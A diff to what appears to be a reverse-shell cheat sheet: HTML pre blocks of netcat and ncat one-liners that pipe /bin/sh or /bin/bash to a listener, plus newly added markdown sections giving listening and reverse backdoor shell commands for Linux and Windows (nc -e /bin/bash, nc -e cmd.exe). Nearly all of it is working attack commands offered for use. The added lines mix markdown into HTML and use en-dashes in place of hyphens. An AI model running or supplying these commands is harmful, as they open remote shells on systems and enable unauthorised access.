@@ -21,6 +21,31 @@ Listener:
 <pre id="nc06">rm -f /tmp/p; mknod /tmp/p p && nc 127.0.0.1 813 0/tmp/p 2>&1</pre>
 <pre id="nc07">rm f;mkfifo f;cat f|/bin/sh -i 2>&1|nc 127.0.0.1 813 > f</pre>
 <pre id="nc08">rm -f x; mknod x p && nc 127.0.0.1 813 0&lt;x | /bin/bash 1>x</pre>
+Listening backdoor shell on Linux:
+```
+$ nc –l –p [LocalPort] –e /bin/bash
+```
+
+Listening backdoor shell on Windows:
+```
+C:\>nc –l –p [LocalPort] –e cmd.exe
+```
+
+Create a shell on local port [LocalPort] that can then be accessed using a fundamental Netcat client
+
+Reverse backdoor shell on Linux:
+```
+$ nc [YourIPaddr] [port] –e /bin/bash
+```
+
+Reverse backdoor shell on Windows:
+```
+C:\>nc [YourIPaddr] [port] –e cmd.exe
+```
+
+Create a reverse shell that will attempt to connect to [YourIPaddr] on local port [port].
+
+This shell can then be captured using a fundamental nc listener
 
 <h3>Ncat:</h3>
 <pre id="ncat01">ncat 127.0.0.1 813 -e /bin/bash</pre>
